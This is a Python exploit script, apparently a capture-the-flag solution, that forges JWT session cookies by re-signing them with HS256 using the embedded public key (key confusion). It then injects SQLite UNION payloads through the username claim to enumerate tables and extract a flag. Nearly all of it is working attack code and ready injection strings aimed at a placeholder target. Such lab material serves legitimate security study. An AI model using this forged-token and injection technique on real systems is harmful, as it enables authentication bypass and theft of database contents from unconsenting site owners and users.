"""
JWT key confusion vulnerabiity to ultimately reach SQLite injection
"""

import jwt  # pip3 install pyjwt==0.4.3
import requests
from requests_toolbelt.utils import dump
from bs4 import BeautifulSoup as bs
import re

TARGET = 'http://<IP>:<PORT>'

class jwt_sqli:
	def __init__(self):
		self.session = requests.session()
		self.token_dict = self.__get_token()

	def __register_user(self):
		# Junk data for user register, which can be anything
		data = {
			'username': 'x',
			'password': 'x',
			'register': 'Register'
		}
		# Trigger user registration
		self.session.post(TARGET + '/auth', data=data, allow_redirects=False)

		# Recycle the data dictionary for user authentication 
		del data['register']
		data['login'] = 'Login'
		return data

	def __get_token(self):
		# First stage is to register user to login
		data = self.__register_user()

		# Next we will login to force the web-application to generate a JWT cookie
		r = self.session.post(TARGET + '/auth', data=data, allow_redirects=False)

		# Decode the JWT so we can modify its contents
		token_dict = jwt.decode(self.session.cookies['session'], verify=False)
		return token_dict

	@staticmethod
	def __parse_output(r):
		soup = bs(r.text, 'html.parser')
		div_tag = soup.find_all("div", {"class": "card-body"})
		if div_tag:
			return div_tag[0].text
		else:
			return 'No output from query, status code: ' + str(r.status_code)

	def inject(self, payload):
		# SQLite injection occurs in the getUser() method, we we modify the username value
		self.token_dict['username'] = payload

		# Sign using HS256 instead of RSA triggering the key confusion vulnerability
		payload = jwt.encode(self.token_dict, self.token_dict['pk'], algorithm='HS256')

		# Exploit the SQLite injection
		self.session.cookies.set('session', payload.decode(), domain=re.split("//|:", TARGET)[2])
		r = self.session.get(TARGET)

		# Print parsed exfiltrated data to stdout
		print(self.__parse_output(r))

def main():
	js = jwt_sqli()

	# # identify display column: 2
	# js.inject("x' UNION SELECT 1,2,3--")

	# # identify tables
	# js.inject("x' UNION SELECT 1, name ,3 FROM sqlite_master WHERE type = 'table' LIMIT 1--")

	# # identify columns within flag table
	# js.inject("x' UNION SELECT 1, sql ,3 FROM sqlite_master WHERE tbl_name = 'flag_storage' AND type = 'table' LIMIT 1--") 

	# identify display column
	js.inject("x' UNION SELECT 1,top_secret_flaag,3 FROM flag_storage --")

if __name__ == '__main__':
	main()
